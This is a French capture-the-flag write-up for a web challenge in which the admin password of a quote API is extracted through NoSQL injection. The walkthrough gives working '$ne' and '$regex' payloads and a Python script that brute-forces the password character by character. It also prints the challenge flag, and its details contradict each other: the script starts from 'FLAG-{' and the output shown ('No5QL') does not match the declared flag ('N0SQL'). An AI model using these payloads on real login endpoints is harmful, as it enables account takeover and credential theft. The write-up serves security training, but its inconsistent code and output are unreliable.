# Quotes-A-Day 1

> Web <br>
> Author: @Strix

# Challenge

We've built a brand new API to allow our users to get an inspirational quote on demand!
Our security team has yet to approve it for production, but I really think we did everything right

Checkout our documentation to get started! `URL DU CHALLENGE/docs`

FLAG: `FLAG{N0SQL_D0ESNT_M3AN_N0_SQLi}`

## Outils nécessaires

- docker-compose

## Exécution

```bash
docker-compose up --build --force-recreate --renew-anon-volumes
```

## Writeup

Le défi est une vulnérabilité assez standard de NoSQL que l'utilisateur doit exploiter. Le flag est le mot de
passe de l'utilisateur admin, qui peut être trouvé en abusant de l'entrée non validée dans les champs email et password
du endpoint /api_key.

Plusieurs payloads peuvent être utilisées, car l'application permet l'utilisation d'objets comme input aux champs email
et password puisque ces derniers ne sont pas validés.

Exemple:

```json
{
  "email": "admin@unite.com"
  "password": {
    "$ne": 1
  }
}
```

Qui nous retourne:

```json
{
  "API_KEY": "6125da25d002882618d55be9",
  "message": "Use API_KEY as the value to the api_key parameter in our other queries"
}
```

Il existe plusieurs [fonctions d'agrégation](https://docs.mongodb.com/manual/aggregation/), tels que "$where", "$regex",
etc. Une des fonctions que nous pouvons utiliser pour trouver le flag est `$regex`. `$regex` nous permet de matcher des
champs du document de la base de donnée avec l'expression donnée en input.

Exemple:

```json
{
  "email": "admin@unite.com",
  "password": {
    "$regex": "FLAG{(.*)}"
  }
}
```

Qui nous retourne la même réponse (200) mentionnée plus haut.

Maintenant, nous savons que le flag est du format FLAG{...}, nous savons aussi qu'une requête réussie nous retourne un
code de 200 et la clé API, donc nous pouvons écrire une fonction qui nous permet d'exécuter des requêtes pour
extraire les lettres entre les deux accolades :

```python
import requests

flag_letters = 'abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVXWYZ0123456789_-{}'
index = 0
flag = "FLAG-{"
url = "http://localhost:3000/api_key"
headers = {'Content-type': 'application/json'}
while True:
    for letter in flag_letters:
        data = {"email": "admin@unite.com", "password": {"$regex": "{}(.*)".format(flag + letter)}}
        response = requests.post(url, json=data, headers=headers)
        index = index + 1
        if "API_KEY" in response.text:
            flag = flag + letter
            print(flag)
            if letter == "}":
                print("Total requests: " + str(index))
                exit(0)
```

Qui nous retourne donc quelque chose comme ça:

```bash
FLAG{N
FLAG{No
FLAG{No5
FLAG{No5Q
... 
FLAG{No5QL_D0ESNT_M3AN_N0_SQLi}
```